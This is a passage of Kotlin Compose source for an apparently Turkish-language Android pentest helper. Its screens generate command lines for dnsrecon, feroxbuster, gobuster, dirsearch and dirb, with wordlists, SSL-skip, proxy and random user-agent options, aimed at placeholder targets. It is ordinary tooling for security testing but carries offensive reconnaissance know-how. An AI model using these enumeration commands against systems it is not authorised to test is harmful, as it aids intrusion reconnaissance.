        val parts = mutableListOf("dnsrecon", "-d", domain.trim(), "-t", scanType)
        if (scanType == "brt" && wordlist.isNotBlank()) parts.addAll(listOf("-D", wordlist.trim()))
        if (ipRange.isNotBlank()) parts.addAll(listOf("-r", ipRange.trim()))
        if (nameserver.isNotBlank()) parts.addAll(listOf("-n", nameserver.trim()))
        if (axfrCheck) parts.add("-a")
        if (spfLookup) parts.add("-s")
        if (googleEnum) parts.add("-g")
        if (deepWhois) parts.add("-w")
        if (dnssecWalk) parts.add("-z")
        parts.addAll(listOf("--threads", threads.trim(), "--lifetime", lifetime.trim()))

        when (outputFormat) {
            "csv" -> parts.addAll(listOf("--csv", "${outputFile.trim()}.csv"))
            "json" -> parts.addAll(listOf("--json", "${outputFile.trim()}.json"))
            "xml" -> parts.addAll(listOf("--xml", "${outputFile.trim()}.xml"))
        }

        GeneratedCommandCard(command = parts.joinToString(" "), language = language)
    }
}

// 12. FEROXBUSTER
@Composable
fun FeroxbusterBuilder(language: AppLanguage) {
    var url by remember { mutableStateOf("https://target.com") }
    var wordlist by remember { mutableStateOf("/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt") }
    var extensions by remember { mutableStateOf("php,html,txt,json,aspx") }
    var depth by remember { mutableStateOf("2") }
    var threads by remember { mutableStateOf("50") }
    var rateLimit by remember { mutableStateOf("250") }
    var statusCodes by remember { mutableStateOf("200,301,302,401,403") }
    var filterCodes by remember { mutableStateOf("404,500") }
    var filterSize by remember { mutableStateOf("") }

    // Gelişmiş Bayraklar
    var noRecursion by remember { mutableStateOf(false) }
    var extractLinks by remember { mutableStateOf(true) }
    var followRedirects by remember { mutableStateOf(true) }
    var insecureSsl by remember { mutableStateOf(true) }
    var autoTune by remember { mutableStateOf(true) }
    var autoBail by remember { mutableStateOf(false) }
    var silent by remember { mutableStateOf(false) }
    var useProxy by remember { mutableStateOf(false) }
    var proxyUrl by remember { mutableStateOf("http://127.0.0.1:8080") }
    var customHeaders by remember { mutableStateOf("") }
    var outputFormat by remember { mutableStateOf("txt") }

    Column {
        OutlinedTextField(
            value = url,
            onValueChange = { url = it },
            label = { Text("Hedef URL (-u https://...)") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
            singleLine = true
        )
        Spacer(modifier = Modifier.height(6.dp))
        OutlinedTextField(
            value = wordlist,
            onValueChange = { wordlist = it },
            label = { Text("Kelime Listesi (-w)") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
            singleLine = true
        )
        Spacer(modifier = Modifier.height(6.dp))
        OutlinedTextField(
            value = extensions,
            onValueChange = { extensions = it },
            label = { Text("Dosya Uzantıları (-x php,html,txt,json)") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
            singleLine = true
        )

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "DURUM KODU VE BOYUT FİLTRELERİ", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedTextField(
                value = statusCodes,
                onValueChange = { statusCodes = it },
                label = { Text("Eşleşen Kodlar (-s)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
            OutlinedTextField(
                value = filterCodes,
                onValueChange = { filterCodes = it },
                label = { Text("Filtrelenen Kodlar (-C)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }
        if (filterSize.isNotBlank()) {
            Spacer(modifier = Modifier.height(6.dp))
            OutlinedTextField(
                value = filterSize,
                onValueChange = { filterSize = it },
                label = { Text("Yanıt Boyutunu Ele (-S 1234)") },
                modifier = Modifier.fillMaxWidth(),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "ÖZYİNELEME VE BAĞLANTI BAYRAKLARI", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        ToggleOption(label = "-e HTML/JS Yanıtlarından Linkleri Çıkar (Extract Links)", checked = extractLinks, onCheckedChange = { extractLinks = it })
        ToggleOption(label = "-r HTTP Yönlendirmelerini Takip Et (Redirects)", checked = followRedirects, onCheckedChange = { followRedirects = it })
        ToggleOption(label = "-k Geçersiz SSL Sertifikalarını Yoksay", checked = insecureSsl, onCheckedChange = { insecureSsl = it })
        ToggleOption(label = "--no-recursion Özyinelemeli Taramayı Kapat", checked = noRecursion, onCheckedChange = { noRecursion = it })
        ToggleOption(label = "--auto-tune Sunucu Hızına Göre Otomatik Ayarla", checked = autoTune, onCheckedChange = { autoTune = it })
        ToggleOption(label = "--auto-bail Çok Fazla Hata Alındığında Otomatik Durdur", checked = autoBail, onCheckedChange = { autoBail = it })
        ToggleOption(label = "-q / --silent Sade Terminal Modu", checked = silent, onCheckedChange = { silent = it })

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "PERFORMANS VE PROXY", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedTextField(
                value = threads,
                onValueChange = { threads = it },
                label = { Text("Threads (-t)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
            OutlinedTextField(
                value = depth,
                onValueChange = { depth = it },
                label = { Text("Derinlik (-d)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
            OutlinedTextField(
                value = rateLimit,
                onValueChange = { rateLimit = it },
                label = { Text("Rate Limit") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }
        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "Proxy Kullan (-p $proxyUrl)", checked = useProxy, onCheckedChange = { useProxy = it })
        Spacer(modifier = Modifier.height(6.dp))
        OutlinedTextField(
            value = customHeaders,
            onValueChange = { customHeaders = it },
            label = { Text("Özel Header (-H 'Authorization: Bearer ..') - Opsiyonel") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
            singleLine = true
        )
        if (useProxy) {
            Spacer(modifier = Modifier.height(6.dp))
            OutlinedTextField(
                value = proxyUrl,
                onValueChange = { proxyUrl = it },
                label = { Text("Proxy Adresi") },
                modifier = Modifier.fillMaxWidth(),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "ÇIKTI FORMATI", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf("txt" to "Metin (-o)", "json" to "JSON (--json)", "none" to "Terminal").forEach { (fmt, lbl) ->
                val isSelected = outputFormat == fmt
                Box(
                    modifier = Modifier
                        .weight(1f)
                        .clip(RoundedCornerShape(6.dp))
                        .background(if (isSelected) CyberGreen.copy(alpha = 0.2f) else SurfaceDark)
                        .border(1.dp, if (isSelected) CyberGreen else BorderDark, RoundedCornerShape(6.dp))
                        .clickable { outputFormat = fmt }
                        .padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) {
                    Text(text = lbl, fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = if (isSelected) CyberGreen else TextSecondary)
                }
            }
        }

        // Live Command Synthesis
        val parts = mutableListOf("feroxbuster", "-u", url.trim(), "-w", wordlist.trim())
        if (extensions.isNotBlank()) parts.addAll(listOf("-x", extensions.trim()))
        if (statusCodes.isNotBlank()) parts.addAll(listOf("-s", statusCodes.trim()))
        if (filterCodes.isNotBlank()) parts.addAll(listOf("-C", filterCodes.trim()))
        if (filterSize.isNotBlank()) parts.addAll(listOf("-S", filterSize.trim()))
        if (noRecursion) parts.add("--no-recursion") else parts.addAll(listOf("-d", depth.trim()))
        if (extractLinks) parts.add("-e")
        if (followRedirects) parts.add("-r")
        if (insecureSsl) parts.add("-k")
        if (autoTune) parts.add("--auto-tune")
        if (autoBail) parts.add("--auto-bail")
        if (silent) parts.add("-q")
        parts.addAll(listOf("-t", threads.trim(), "--rate-limit", rateLimit.trim()))
        if (customHeaders.isNotBlank()) parts.addAll(listOf("-H", "\"$customHeaders\""))
        if (useProxy && proxyUrl.isNotBlank()) parts.addAll(listOf("-p", proxyUrl.trim()))

        when (outputFormat) {
            "txt" -> parts.addAll(listOf("-o", "ferox_results.txt"))
            "json" -> parts.addAll(listOf("--json", "-o", "ferox_results.json"))
        }

        GeneratedCommandCard(command = parts.joinToString(" "), language = language)
    }
}

// 13. GOBUSTER
@Composable
fun GobusterBuilder(language: AppLanguage) {
    var mode by remember { mutableStateOf("dir") }
    var target by remember { mutableStateOf("https://target.com") }
    var wordlist by remember { mutableStateOf("/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt") }
    var extensions by remember { mutableStateOf("php,txt,html,json") }
    var threads by remember { mutableStateOf("50") }
    var statusCodes by remember { mutableStateOf("200,204,301,302,307,401,403") }
    var excludeCodes by remember { mutableStateOf("404") }
    var timeout by remember { mutableStateOf("10s") }

    // Bayraklar
    var expanded by remember { mutableStateOf(false) }
    var followRedirect by remember { mutableStateOf(true) }
    var insecureSsl by remember { mutableStateOf(true) }
    var wildcard by remember { mutableStateOf(false) }
    var noError by remember { mutableStateOf(true) }
    var cookies by remember { mutableStateOf("") }
    var customHeader by remember { mutableStateOf("") }
    var proxy by remember { mutableStateOf("") }
    var saveOutput by remember { mutableStateOf(true) }

    Column {
        Text(text = "TARAMA MODU", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf("dir" to "Dizin (dir)", "dns" to "Subdomain (dns)", "vhost" to "Sanal Host (vhost)", "fuzz" to "Fuzzing (fuzz)", "s3" to "AWS S3").forEach { (m, lbl) ->
                val isSelected = mode == m
                Box(
                    modifier = Modifier
                        .weight(1f)
                        .clip(RoundedCornerShape(6.dp))
                        .background(if (isSelected) CyberGreen.copy(alpha = 0.2f) else SurfaceDark)
                        .border(1.dp, if (isSelected) CyberGreen else BorderDark, RoundedCornerShape(6.dp))
                        .clickable { mode = m }
                        .padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) {
                    Text(text = lbl, fontSize = 9.5.sp, fontFamily = FontFamily.Monospace, textAlign = androidx.compose.ui.text.style.TextAlign.Center, color = if (isSelected) CyberGreen else TextSecondary)
                }
            }
        }

        Spacer(modifier = Modifier.height(8.dp))
        OutlinedTextField(
            value = target,
            onValueChange = { target = it },
            label = { Text(if (mode == "dns") "Hedef Alan Adı (-d target.com)" else "Hedef URL (-u https://...)") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
            singleLine = true
        )
        Spacer(modifier = Modifier.height(6.dp))
        OutlinedTextField(
            value = wordlist,
            onValueChange = { wordlist = it },
            label = { Text("Wordlist (-w)") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
            singleLine = true
        )

        if (mode == "dir") {
            Spacer(modifier = Modifier.height(6.dp))
            OutlinedTextField(
                value = extensions,
                onValueChange = { extensions = it },
                label = { Text("Dosya Uzantıları (-x php,html,txt,json)") },
                modifier = Modifier.fillMaxWidth(),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "DURUM KODLARI VE PERFORMANS", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedTextField(
                value = statusCodes,
                onValueChange = { statusCodes = it },
                label = { Text("Kabul Kodları (-s)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
            OutlinedTextField(
                value = excludeCodes,
                onValueChange = { excludeCodes = it },
                label = { Text("Dışlanan Kodlar (-b)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }
        Spacer(modifier = Modifier.height(6.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedTextField(
                value = threads,
                onValueChange = { threads = it },
                label = { Text("Threads (-t)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
            OutlinedTextField(
                value = timeout,
                onValueChange = { timeout = it },
                label = { Text("Timeout (--timeout)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "GELİŞMİŞ BAYRAKLAR", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        ToggleOption(label = "-e Genişletilmiş Çıktı (Tam URL'leri Ekrana Bas)", checked = expanded, onCheckedChange = { expanded = it })
        ToggleOption(label = "-r HTTP Yönlendirmelerini Takip Et", checked = followRedirect, onCheckedChange = { followRedirect = it })
        ToggleOption(label = "-k SSL Sertifika Doğrulamasını Atla", checked = insecureSsl, onCheckedChange = { insecureSsl = it })
        ToggleOption(label = "--wildcard Wildcard Yanıtlarında Taramaya Zorla", checked = wildcard, onCheckedChange = { wildcard = it })
        ToggleOption(label = "--no-error Hata Mesajlarını Gizle", checked = noError, onCheckedChange = { noError = it })
        ToggleOption(label = "-o gobuster_results.txt Dosyaya Kaydet", checked = saveOutput, onCheckedChange = { saveOutput = it })

        // Live Command Synthesis
        val parts = mutableListOf("gobuster", mode)
        if (mode == "dns") {
            parts.addAll(listOf("-d", target.trim()))
        } else {
            parts.addAll(listOf("-u", target.trim()))
        }
        parts.addAll(listOf("-w", wordlist.trim()))

        if (mode == "dir" && extensions.isNotBlank()) parts.addAll(listOf("-x", extensions.trim()))
        if (statusCodes.isNotBlank()) parts.addAll(listOf("-s", statusCodes.trim()))
        if (excludeCodes.isNotBlank()) parts.addAll(listOf("-b", excludeCodes.trim()))
        parts.addAll(listOf("-t", threads.trim(), "--timeout", timeout.trim()))

        if (expanded) parts.add("-e")
        if (followRedirect) parts.add("-r")
        if (insecureSsl) parts.add("-k")
        if (wildcard) parts.add("--wildcard")
        if (noError) parts.add("--no-error")
        if (cookies.isNotBlank()) parts.addAll(listOf("-c", "'$cookies'"))
        if (customHeader.isNotBlank()) parts.addAll(listOf("-H", "'$customHeader'"))
        if (proxy.isNotBlank()) parts.addAll(listOf("--proxy", proxy.trim()))
        if (saveOutput) parts.addAll(listOf("-o", "gobuster_results.txt"))

        GeneratedCommandCard(command = parts.joinToString(" "), language = language)
    }
}

// 14. DIRSEARCH
@Composable
fun DirsearchBuilder(language: AppLanguage) {
    var url by remember { mutableStateOf("https://target.com") }
    var wordlist by remember { mutableStateOf("/usr/share/wordlists/dirsearch/common.txt") }
    var extensions by remember { mutableStateOf("php,html,js,json,txt,asp,aspx") }
    var includeCodes by remember { mutableStateOf("200,301,302,401,403") }
    var excludeCodes by remember { mutableStateOf("404,500") }
    var excludeSizes by remember { mutableStateOf("0B") }
    var threads by remember { mutableStateOf("50") }
    var delay by remember { mutableStateOf("0.1") }
    var maxDepth by remember { mutableStateOf("3") }

    // Bayraklar
    var recursive by remember { mutableStateOf(false) }
    var forceExtensions by remember { mutableStateOf(false) }
    var randomAgent by remember { mutableStateOf(true) }
    var crawl by remember { mutableStateOf(false) }
    var useProxy by remember { mutableStateOf(false) }
    var proxyUrl by remember { mutableStateOf("http://127.0.0.1:8080") }
    var outputFormat by remember { mutableStateOf("plain") }

    Column {
        OutlinedTextField(
            value = url,
            onValueChange = { url = it },
            label = { Text("Hedef URL (-u) veya Liste (-l)") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
            singleLine = true
        )
        Spacer(modifier = Modifier.height(6.dp))
        OutlinedTextField(
            value = wordlist,
            onValueChange = { wordlist = it },
            label = { Text("Wordlist (-w)") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
            singleLine = true
        )
        Spacer(modifier = Modifier.height(6.dp))
        OutlinedTextField(
            value = extensions,
            onValueChange = { extensions = it },
            label = { Text("Uzantılar (-e php,html,js,json)") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
            singleLine = true
        )

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "KOD VE BOYUT FİLTRELERİ", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedTextField(
                value = includeCodes,
                onValueChange = { includeCodes = it },
                label = { Text("Dahil Kodlar (-i)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
            OutlinedTextField(
                value = excludeCodes,
                onValueChange = { excludeCodes = it },
                label = { Text("Hariç Kodlar (-x)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
            OutlinedTextField(
                value = excludeSizes,
                onValueChange = { excludeSizes = it },
                label = { Text("Hariç Boyut") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "ÖZYİNELEME VE TARAMA SEÇENEKLERİ", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        ToggleOption(label = "-r Özyinelemeli (Recursive) Alt Dizin Keşfi", checked = recursive, onCheckedChange = { recursive = it })
        if (recursive) {
            OutlinedTextField(
                value = maxDepth,
                onValueChange = { maxDepth = it },
                label = { Text("Maksimum Özyineleme Derinliği (-R)") },
                modifier = Modifier.fillMaxWidth(),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
            Spacer(modifier = Modifier.height(6.dp))
        }
        ToggleOption(label = "-f Tüm Kelimelere Uzantı Ekle (Force Extension)", checked = forceExtensions, onCheckedChange = { forceExtensions = it })
        ToggleOption(label = "--crawl Sayfa İçeriklerinden Yeni Yolları Tara", checked = crawl, onCheckedChange = { crawl = it })
        ToggleOption(label = "--random-agent Rastgele User-Agent Rotasyonu", checked = randomAgent, onCheckedChange = { randomAgent = it })

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "PERFORMANS VE ÇIKTI FORMATI", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedTextField(
                value = threads,
                onValueChange = { threads = it },
                label = { Text("Threads (-t)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
            OutlinedTextField(
                value = delay,
                onValueChange = { delay = it },
                label = { Text("Gecikme sn (-s)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }
        Spacer(modifier = Modifier.height(6.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf("plain" to "Metin (plain)", "json" to "JSON (json)", "html" to "HTML (html)").forEach { (fmt, lbl) ->
                val isSelected = outputFormat == fmt
                Box(
                    modifier = Modifier
                        .weight(1f)
                        .clip(RoundedCornerShape(6.dp))
                        .background(if (isSelected) CyberGreen.copy(alpha = 0.2f) else SurfaceDark)
                        .border(1.dp, if (isSelected) CyberGreen else BorderDark, RoundedCornerShape(6.dp))
                        .clickable { outputFormat = fmt }
                        .padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) {
                    Text(text = lbl, fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = if (isSelected) CyberGreen else TextSecondary)
                }
            }
        }

        // Live Command Synthesis
        val parts = mutableListOf("dirsearch")
        if (url.trim().endsWith(".txt")) {
            parts.addAll(listOf("-l", url.trim()))
        } else {
            parts.addAll(listOf("-u", url.trim()))
        }
        parts.addAll(listOf("-w", wordlist.trim(), "-e", extensions.trim()))

        if (includeCodes.isNotBlank()) parts.addAll(listOf("-i", includeCodes.trim()))
        if (excludeCodes.isNotBlank()) parts.addAll(listOf("-x", excludeCodes.trim()))
        if (excludeSizes.isNotBlank()) parts.addAll(listOf("--exclude-sizes", excludeSizes.trim()))
        if (recursive) parts.addAll(listOf("-r", "-R", maxDepth.trim()))
        if (forceExtensions) parts.add("-f")
        if (crawl) parts.add("--crawl")
        if (randomAgent) parts.add("--random-agent")
        parts.addAll(listOf("-t", threads.trim(), "-s", delay.trim()))

        if (useProxy && proxyUrl.isNotBlank()) parts.addAll(listOf("--proxy", proxyUrl.trim()))
        parts.addAll(listOf("-o", "dirsearch_results.${if (outputFormat == "plain") "txt" else outputFormat}", "--format", outputFormat))

        GeneratedCommandCard(command = parts.joinToString(" "), language = language)
    }
}

// 15. DIRB
@Composable
fun DirbBuilder(language: AppLanguage) {
    var url by remember { mutableStateOf("http://10.10.10.100/") }
    var wordlist by remember { mutableStateOf("/usr/share/wordlists/dirb/common.txt") }
    var customExtensions by remember { mutableStateOf(".php,.html,.txt") }
    var enableExtensions by remember { mutableStateOf(false) }
    var nonRecursive by remember { mutableStateOf(false) }
    var caseInsensitive by remember { mutableStateOf(false) }
    var ignoreWarning by remember { mutableStateOf(true) }
    var ignoreCode by remember { mutableStateOf("404") }
    var delayMs by remember { mutableStateOf("0") }
    var userAgent by remember { mutableStateOf("") }
    var cookie by remember { mutableStateOf("") }
    var proxy by remember { mutableStateOf("") }
    var authUserPass by remember { mutableStateOf("") }
    var saveOutput by remember { mutableStateOf(true) }

    Column {
        OutlinedTextField(
            value = url,
            onValueChange = { url = it },
            label = { Text("Hedef Web URL (http://10.10.10.100/)") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
            singleLine = true
        )
        Spacer(modifier = Modifier.height(6.dp))
        OutlinedTextField(
            value = wordlist,
            onValueChange = { wordlist = it },
            label = { Text("Wordlist Yolu") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
            singleLine = true
        )

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "TARAMA BAYRAKLARI", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        ToggleOption(label = "-r Özyinelemeli Taramayı Durdur (Non-recursive)", checked = nonRecursive, onCheckedChange = { nonRecursive = it })
        ToggleOption(label = "-i Büyük/Küçük Harf Duyarsız Tarama (Case-insensitive)", checked = caseInsensitive, onCheckedChange = { caseInsensitive = it })
        ToggleOption(label = "-w Uyarı Mesajlarında Duraksama Yapma", checked = ignoreWarning, onCheckedChange = { ignoreWarning = it })
        ToggleOption(label = "-X Özel Uzantı Listesi Kullan ($customExtensions)", checked = enableExtensions, onCheckedChange = { enableExtensions = it })
        if (enableExtensions) {
            OutlinedTextField(
                value = customExtensions,
                onValueChange = { customExtensions = it },
                label = { Text("Uzantılar (-X .php,.html,.txt)") },
                modifier = Modifier.fillMaxWidth(),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
            Spacer(modifier = Modifier.height(6.dp))
        }

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "BAĞLANTI VE GECİKME", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedTextField(
                value = delayMs,
                onValueChange = { delayMs = it },
                label = { Text("Gecikme ms (-z)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
            OutlinedTextField(
                value = ignoreCode,
                onValueChange = { ignoreCode = it },
                label = { Text("Yoksay Kod (-N)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }
        Spacer(modifier = Modifier.height(6.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedTextField(
                value = authUserPass,
                onValueChange = { authUserPass = it },
                label = { Text("HTTP Auth (-u user:pass)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
            OutlinedTextField(
                value = proxy,
                onValueChange = { proxy = it },
                label = { Text("Proxy (-p 127.0.0.1:8080)") },
                modifier = Modifier.weight(1f),
